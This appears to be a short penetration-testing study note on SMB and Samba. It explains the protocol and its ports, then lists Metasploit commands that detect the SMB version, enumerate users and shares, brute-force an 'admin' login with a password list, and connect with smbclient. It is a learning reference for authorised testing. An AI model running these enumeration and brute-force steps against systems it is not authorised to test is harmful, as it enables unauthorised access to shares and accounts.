
\- SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files between computers on a local network. 

\- SMB usually run on port 445. (Originally, SMB ran on top of NetBIOS using port 139)

\- SAMBA is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

```
msfconsole

> setg RHOSTS <ip>  // Set RHOSTS globally

// SMB Version
> search type:auxiliary name:smb
> use auxiliary/scanner/smb/smb_version
> run

// Enum Users
> use auxiliary/scanner/smb/smb_enumusers
> run

// Enum Shares
> use auxiliary/scanner/smb/smb_enumshares
> run

// Bruteforce SMB
> use auxiliary/scanner/smb/smb_login
> set SMBUser admin
> set PASS_FILE ...../unix_passwords.txt
> run

// Connect with smbclient 
smbclient -L \\\\<ip>\\ -U admin (We can see the shares we can access)

// Access the shares
smbclient \\\\<ip>\\<shares> -U admin
```